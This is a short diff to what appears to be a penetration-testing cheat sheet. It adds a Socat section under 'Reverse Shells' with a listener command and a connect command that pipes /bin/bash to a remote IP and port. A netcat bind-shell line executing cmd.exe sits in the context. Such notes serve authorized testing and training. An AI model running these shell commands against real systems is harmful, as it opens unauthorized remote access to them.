@@ -30,6 +30,22 @@ nc -nlvp 51337 -e cmd.exe
 
 ## Reverse Shells
 
+### Socat
+
+Listen:
+
+```text
+socat -d -d TCP4-LISTEN:443 STDOUT
+```
+
+* -d -d = increase verbosity \(fatal, error, warning, notice\)
+
+Connect:
+
+```text
+socat TCP4:IP:PORT EXEC:/bin/bash
+```
+
 ### PowerCat
 
 For powercat, a payload is a set of PowerShell instructions **\(Can be detected by AV and IDS\)**
